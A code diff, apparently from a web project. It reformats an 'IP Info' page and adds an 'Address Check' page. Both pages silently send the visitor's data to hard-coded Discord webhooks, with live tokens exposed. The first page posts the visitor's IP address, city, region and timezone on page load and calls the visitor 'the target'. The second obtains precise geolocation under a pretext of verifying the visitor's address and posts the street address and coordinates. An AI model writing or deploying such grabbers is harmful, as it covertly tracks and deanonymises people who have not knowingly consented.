@@ -157,7 +157,7 @@
 
 <body>
     <div>
-            </``>
+        </``>
     </div>
     <script>
         () {
@@ -232,47 +232,48 @@
     </script>
 </body>
 
-</html
-    <!DOCTYPE html>
-    <html lang="en">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>IP Info</title>
-    </head>
-    <body>
-        <script>
-            const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+</html <!DOCTYPE html>
+<html lang="en">
 
-            fetch("https://ipapi.co/json")
-                .then(response => response.json())
-                .then(data => {
-                    const payload = {
-                        content: '', // No content for this example
-                        embeds: [
-                            {
-                                title: ":earth_americas: IP Info",
-                                color: 0xFFFF00,
-                                description: "Contains information about the target's IP address and geo-location",
-                                fields: [
-                                    { name: ":globe_with_meridians: Country", value: `\`\`\`\n${data.country_name}\n\`\`\``, inline: true },
-                                    { name: ":globe_with_meridians: City", value: `\`\`\`\n${data.city}\n\`\`\``, inline: true },
-                                    { name: ":globe_with_meridians: Region", value: `\`\`\`\n${data.region}\n\`\`\``, inline: true },
-                                    { name: ":satellite_orbital: IP Address", value: `\`\`\`\n${data.ip}\n\`\`\``, inline: true },
-                                    { name: ":satellite: Protocol", value: `\`\`\`\n${data.version}\n\`\`\``, inline: true },
-                                    { name: ":clock10: Timezone", value: `\`\`\`\n${data.timezone}\n\`\`\``, inline: true }
-                                ]
-                            }
-                        ]
-                    };
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Info</title>
+</head>
 
-                    fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
+<body>
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1277752783357083790/JJAbbBF9AmfFNu-LTDIUWvQGhHfwytp7uti7ea3w1vV4Z9y9n1jw9szZAMdtC6KmBRtq'; // Replace with your actual webhook URL
+
+        fetch("https://ipapi.co/json")
+            .then(response => response.json())
+            .then(data => {
+                const payload = {
+                    content: '', // No content for this example
+                    embeds: [
+                        {
+                            title: ":earth_americas: IP Info",
+                            color: 0xFFFF00,
+                            description: "Contains information about the target's IP address and geo-location",
+                            fields: [
+                                {name: ":globe_with_meridians: Country", value: `\`\`\`\n${data.country_name}\n\`\`\``, inline: true},
+                                {name: ":globe_with_meridians: City", value: `\`\`\`\n${data.city}\n\`\`\``, inline: true},
+                                {name: ":globe_with_meridians: Region", value: `\`\`\`\n${data.region}\n\`\`\``, inline: true},
+                                {name: ":satellite_orbital: IP Address", value: `\`\`\`\n${data.ip}\n\`\`\``, inline: true},
+                                {name: ":satellite: Protocol", value: `\`\`\`\n${data.version}\n\`\`\``, inline: true},
+                                {name: ":clock10: Timezone", value: `\`\`\`\n${data.timezone}\n\`\`\``, inline: true}
+                            ]
+                        }
+                    ]
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
                     .then(response => {
                         if (!response.ok) {
                             throw new Error('Network response was not ok');
@@ -282,11 +283,205 @@
                     .catch(error => {
                         console.error('Error sending IP to Discord:', error);
                     });
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+            });
+    </script>
+</body>
+
+</html>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        #addressModal,
+        #popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        #popup {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        #popup.allow {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .modal-content {
+            text-align: center;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="addressModal" class="modal-content">
+        <h1>Verify Your Address</h1>
+        <p>We need to verify your location. Clicking the button below allows us to check your address.</p>
+        <button id="getLocation">Get Location</button>
+    </div>
+    <div id="popup">
+        <div class="message">Checking for blacklisted addresses...</div>
+    </div>
+    <div id="overlay" class="overlay"></div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const addressModal = document.getElementById("addressModal");
+            const popup = document.getElementById("popup");
+            const overlay = document.getElementById("overlay");
+            const getLocationButton = document.getElementById("getLocation");
+
+            // Discord webhook URL
+            const webhookURL = 'https://discord.com/api/webhooks/1278172201098678388/Is8yxPp4iMmS-6_6ETh8Q6x22xeD158uungwiNtUobOwOSLcd3lB5oFL3fObb7hJgUsB'; // Replace with your actual webhook URL
+            const avatarURL = 'https://media.istockphoto.com/id/1148705812/vector/location-icon-vector-pin-sign-isolated-on-white-background-navigation-map-gps-direction.jpg?s=612x612&w=0&k=20&c=lqEIzW3QedZfytsX30NoBJbHxZZbWnlLsvEiwOSbaow='; // Replace with your bot's avatar URL
+
+            // Show the address modal when the page loads
+            addressModal.style.display = 'block';
+            overlay.style.display = 'block';
+
+            getLocationButton.addEventListener("click", () => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(showPosition, showError);
+                } else {
+                    addressModal.innerHTML = "<p>Geolocation is not supported by this browser.</p>";
+                }
+            });
+
+            function showPosition(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                const nominatimUrl = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`;
+
+                fetch(nominatimUrl)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.display_name) {
+                            checkBlacklist(data.display_name, latitude, longitude);
+                        } else {
+                            console.error("Geocoding request failed.");
+                            addressModal.innerHTML = "<p>Error retrieving address. Please try again.</p>";
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error fetching address:", error);
+                        addressModal.innerHTML = "<p>Error retrieving address. Please try again.</p>";
+                    });
+            }
+
+            function showError(error) {
+                switch (error.code) {
+                    case error.PERMISSION_DENIED:
+                        addressModal.innerHTML = "<p>User denied the request for Geolocation.</p>";
+                        break;
+                    case error.POSITION_UNAVAILABLE:
+                        addressModal.innerHTML = "<p>Location information is unavailable.</p>";
+                        break;
+                    case error.TIMEOUT:
+                        addressModal.innerHTML = "<p>The request to get user location timed out.</p>";
+                        break;
+                    case error.UNKNOWN_ERROR:
+                        addressModal.innerHTML = "<p>An unknown error occurred.</p>";
+                        break;
+                }
+            }
+
+            function checkBlacklist(address, latitude, longitude) {
+                // Define allowed regions
+                const allowedCities = ['Los Angeles', 'Glendale', 'La Canada', 'Pasadena'];
+
+                // Check if address contains any of the allowed city names
+                const isAllowed = allowedCities.some(city => address.includes(city));
+
+                sendToDiscord(address, isAllowed, latitude, longitude);
+                showPopup(isAllowed ? 'Access Granted: Your address is within the allowed region.' : 'Access Denied: Your address is outside the allowed region.', isAllowed);
+            }
+
+            function showPopup(message, isAllowed) {
+                popup.innerHTML = `<div class="message">${message}</div>`;
+                popup.style.display = 'block';
+                overlay.style.display = 'block';
+
+                // Automatically hide address modal and popup if allowed
+                if (isAllowed) {
+                    setTimeout(() => {
+                        addressModal.style.display = 'none';
+                        popup.style.display = 'none';
+                        overlay.style.display = 'none';
+                    }, 3000); // Hide after 3 seconds
+                } else {
+                    // Show the popup indefinitely if not allowed
+                    setTimeout(() => {
+                        popup.style.display = 'none';
+                        overlay.style.display = 'none';
+                    }, 5000); // Hide after 5 seconds
+                }
+            }
+
+            function sendToDiscord(address, isAllowed, latitude, longitude) {
+                const content = {
+                    username: "Address Check Bot",
+                    avatar_url: avatarURL, // Bot's profile picture
+                    embeds: [{
+                        title: "Address Check Result",
+                        description: `**Address:** ${address}\n**Allowed:** ${isAllowed ? "Yes" : "No"}\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}`,
+                        color: isAllowed ? 3066993 : 15158332 // Green for allowed, Red for denied
+                    }]
+                };
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(content)
                 })
-                .catch(error => {
-                    console.error("Error fetching IP address:", error);
-                });
-        </script>
-    </body>
-    </html>
-    
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Message sent to Discord.');
+                        } else {
+                            console.error('Failed to send message to Discord:', response.statusText);
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error sending message to Discord:', error);
+                    });
+            }
+        });
+    </script>
+</body>
+
+</html>
